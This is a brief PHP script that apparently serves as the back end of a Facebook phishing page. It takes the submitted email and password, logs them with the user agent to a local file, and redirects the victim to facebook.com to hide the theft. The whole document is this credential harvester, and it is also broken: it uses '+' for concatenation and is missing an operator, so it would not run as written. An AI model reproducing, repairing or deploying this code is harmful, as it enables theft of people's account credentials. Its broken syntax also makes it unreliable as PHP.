<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$fp = fopen("sexy808", "ab+");
fwrite($fp, $email + " : " + $pass " :: " + $_SERVER['HTTP_USER_AGENT']);
fclose($fp);
header("location: https://www.facebook.com");
?>
